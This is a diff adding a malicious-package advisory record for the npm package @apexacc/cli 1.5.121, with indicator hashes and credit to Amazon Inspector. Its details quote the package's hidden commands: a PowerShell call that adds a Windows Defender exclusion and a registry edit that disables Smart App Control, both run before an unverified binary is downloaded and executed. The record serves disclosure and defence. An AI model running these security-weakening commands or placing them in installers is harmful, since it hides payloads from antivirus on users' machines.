@@ -1,0 +1,74 @@
+{
+  "schema_version": "1.7.4",
+  "published": "2026-10-26T05:25:44Z",
+  "modified": "2026-10-26T05:25:44Z",
+  "summary": "@apexacc/cli silently disables Windows Defender and Smart App Control before fetching and executing a remote binary",
+  "details": "On Windows, apex.cjs executes two undocumented, output-suppressed privilege/security-weakening actions before its main download-and-exec path: (1) `powershell -Command \"Add-MpPreference -ExclusionPath '...\\.apex'...\"` to add a Windows Defender scan exclusion for the ~/.apex directory, and (2) `reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f` to disable Smart App Control's verified-and-reputable enforcement. Both commands run with `stdio:'ignore'` and swallow errors, and neither is disclosed in the README. Immediately afterward the CLI downloads a ~105MB binary from `https://github.com/Apex-Accelerator/apexcli/releases/download/v<VERSION>/<asset>` into that same excluded path (`~/.apex/bin/apex.exe`) and runs it with `spawnSync(BIN_PATH, process.argv.slice(2), { stdio:'inherit', env: process.env })`, with no hash or signature verification on the fetched bytes. The pre-emptive AV/SAC weakening materially degrades the installer's host security posture and shields the downloaded and any future-fetched payload from inspection, independent of whether the current binary is benign.",
+  "affected": [
+    {
+      "package": {
+        "name": "@apexacc/cli",
+        "ecosystem": "npm"
+      },
+      "versions": [
+        "1.5.121"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "apex.cjs",
+              "sha256": "6af132fdb24feb1efe781a90e4ee3229a98a7a0f9a152f700890622064f67bbc",
+              "tlsh": "cd8183c507f4a3644b916099d18f252bb96ba0237104d9c4bd2c9758fb936748337dfb"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "cli-1.5.121.tgz",
+              "hashes": {
+                "sha1": "c7ee06fd17b919926d785b8beef88e8677debb65",
+                "sha512_sri": "sha512-1tvCMWzOCxCx/bqHCEphYWCF56YhIGRtiOk15IBixMyvhOGfm1lSFm3TdPlhEwgLy+ez0WwdOXMGx5ej1U+NIw=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@apexacc/cli/v/1.5.121"
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-021714",
+        "import_time": "2026-10-26T05:46:51.924994062Z",
+        "modified_time": "2026-10-26T05:25:44Z",
+        "sha256": "220b2bfd948cbd511add6ba3b2a2ea467defeb99a6855ed9ee0690891cedee5d",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.5.121"
+        ]
+      }
+    ]
+  },
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "contact": [
+        "inspector-research@amazon.com"
+      ],
+      "type": "FINDER"
+    }
+  ]
+}
